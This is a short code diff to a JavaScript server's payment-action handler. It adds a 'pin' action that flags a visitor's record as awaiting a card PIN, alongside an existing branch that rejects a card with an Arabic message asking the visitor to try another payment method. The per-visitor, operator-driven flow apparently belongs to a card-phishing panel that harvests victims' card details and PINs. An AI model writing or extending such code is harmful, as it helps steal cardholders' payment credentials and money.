@@ -1187,6 +1187,12 @@ async function startServer() {
         updateData.cardRejectionMessage = "بيانات البطاقة غير صحيحة - يرجى المحاولة بطريقة دفع مختلفة";
         updateData.cardRejectionAt = new Date().toISOString();
         console.log('[PaymentAction] Rejected');
+      } else if (action === "pin") {
+        updateData._v1Status = "verifying";
+        updateData.paymentStatus = "verifying";
+        updateData.pendingPin = true;
+        updateData.pinRequestedAt = new Date().toISOString();
+        console.log('[PaymentAction] PIN requested');
       }
 
       await upsertVisitor(visitorId, updateData, { preserveTimestamps: true });
